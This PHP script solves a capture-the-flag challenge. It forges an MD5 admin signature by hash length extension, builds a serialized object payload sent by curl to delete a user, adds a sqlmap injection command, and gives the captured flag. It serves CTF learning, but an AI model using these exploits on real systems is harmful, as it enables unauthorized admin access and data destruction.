<?php

class admin {
    var $name;
    var $check;
    var $data;
    var $method;
    var $userid;
    var $msgid;

    function check(){
        $username = addslashes($this->name);//进入数据库的数据进行转义
        @mysql_conn();
        $sql = "select * from user where name='$username'";
        $result = @mysql_fetch_array(mysql_query($sql));
        mysql_close();
        if(!empty($result)){
            //利用 salt 验证是否为该用户
            if($this->check === md5($result['salt'] . $this->data . $username)){
                echo '(=-=)!!';
                if($result['role'] == 1){//检查是否为admin用户
                    return 1;
                }
                else{
                    return 0;
                }
            }
            else{
                return 0;
            }
        }
        else{
            return 0;
        }
    }

    function do_method(){
        if($this->check() === 1){
            if($this->method === 'del_msg'){
                $this->del_msg();
            }
            elseif($this->method === 'del_user'){
                $this->del_user();
            }
            else{
                exit();
            }
        }
    }

    function del_msg(){
        if($this->msgid)
        {
            $msg_id = intval($this->msgid);//防注入
            @mysql_conn();
            $sql1 = "DELETE FROM msg where id='$msg_id'";
            if(mysql_query($sql1)){
                echo('<script>alert("Delete message success!!")</script>');
                exit();
            }
            else{
                echo('<script>alert("Delete message wrong!!")</script>');
                exit();
            }
            mysql_close();
        }
        else{
            echo('<script>alert("Check Your msg_id!!")</script>');
            exit();
        }
    }

    function del_user(){
        if($this->userid){
            $user_id = intval($this->userid);//防注入
            if($user_id == 1){
                echo('<script>alert("Admin can\'t delete!!")</script>');
                exit();
            }
            @mysql_conn();
            $sql2 = "DELETE FROM user where userid='$user_id'";
            if(mysql_query($sql2)){
                echo('<script>alert("Delete user success!!")</script>');
                exit();
            }
            else{
                echo('<script>alert("Delete user wrong!!")</script>');
                exit();
            }
            
            mysql_close();
        }
        else{
            echo('<script>alert("Check Your user_id!!")</script>');
            exit();
        }
    }
}

// Writeups
// https://blog.l1n3.net/writeup/swpu_ctf_2016_writeup/

// ./hash_extender -f md5 -l 16 -d "" -s 2094e54eb1c17d8c56d0e8a6bda9c574 -a "admin"
// Type: md5
// Secret length: 16
// New signature: 4af6ae895d65fe450ff1e9531e0579d2
// New string: 80000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000061646d696e

$x = new admin();
$x->name = "admin";
$x->check = "4af6ae895d65fe450ff1e9531e0579d2";
$x->data = "\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00";
$x->method = "del_user";
$x->userid = "25"; // your user id
$x->msgid = "1";
$xx = serialize($x);
// DEL USER API
echo "curl -vv 'http://106.39.10.134:10004/api.php?api=".base64_encode($xx)."'";

// sqlmap
// sqlmap -u "http://106.39.10.134:10004/riji.php?id=1" -p id --cookie "PHPSESSID=yousessid"
// 
// whaleCTF{fuiewqnf0dn4jgfknde}
